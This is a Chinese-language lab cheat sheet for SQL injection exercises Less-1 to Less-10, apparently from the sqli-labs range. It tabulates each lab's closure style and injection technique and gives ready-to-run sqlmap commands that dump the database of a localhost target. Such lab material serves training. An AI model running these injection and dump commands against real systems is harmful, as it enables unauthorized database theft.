# GET 基础注入 (Less-1 ~ Less-10)

## 注入类型对照

| Less | 闭合方式 | 注入技术 | 特殊注意 |
|------|---------|---------|---------|
| 1 | `'id'` 单引号字符型 | UNION | -- |
| 2 | `id` 数字型 | UNION | 最简单，无需闭合 |
| 3 | `('id')` 单引号+括号 | UNION | -- |
| 4 | `("id")` 双引号+括号 | UNION | -- |
| 5 | `'id'` 单引号 | Error (双注入) | 无回显，有报错 |
| 6 | `"id"` 双引号 | Error (双注入) | 无回显，有报错 |
| 7 | `(('id'))` 双层括号 | UNION + prefix | 需手动指定 prefix/suffix |
| 8 | `'id'` 单引号 | Boolean 盲注 | 无回显无报错，页面有 True/False 差异 |
| 9 | `'id'` 单引号 | Time 盲注 | 完全无回显，靠 SLEEP() 延时判断 |
| 10 | `"id"` 双引号 | Time 盲注 | 完全无回显，靠 SLEEP() 延时判断 |

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-1: 单引号字符型

```bash
sqlmap -u "$TARGET/Less-1/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-1"
```

### Less-2: 数字型

```bash
sqlmap -u "$TARGET/Less-2/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-2"
```

### Less-3: 单引号+括号

```bash
sqlmap -u "$TARGET/Less-3/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-3"
```

### Less-4: 双引号+括号

```bash
sqlmap -u "$TARGET/Less-4/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-4"
```

### Less-5: 单引号+报错注入（双注入）

```bash
sqlmap -u "$TARGET/Less-5/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-5"
```

### Less-6: 双引号+报错注入（双注入）

```bash
sqlmap -u "$TARGET/Less-6/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-6"
```

### Less-7: 双层括号+文件导出

> sqlmap 无法自动识别双层括号，需手动指定 `--prefix` 和 `--suffix`

```bash
sqlmap -u "$TARGET/Less-7/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --prefix="'))" --suffix="-- -" \
    --dump --output-dir="$RESULTS_DIR/Less-7"
```

### Less-8: 单引号+布尔盲注

```bash
sqlmap -u "$TARGET/Less-8/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-8"
```

### Less-9: 单引号+时间盲注

```bash
sqlmap -u "$TARGET/Less-9/?id=1" \
    --batch --random-agent --threads=3 --dbms=mysql \
    --technique=T --time-sec=5 --dump --output-dir="$RESULTS_DIR/Less-9"
```

### Less-10: 双引号+时间盲注

```bash
sqlmap -u "$TARGET/Less-10/?id=1" \
    --batch --random-agent --threads=3 --dbms=mysql \
    --technique=T --time-sec=5 --dump --output-dir="$RESULTS_DIR/Less-10"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
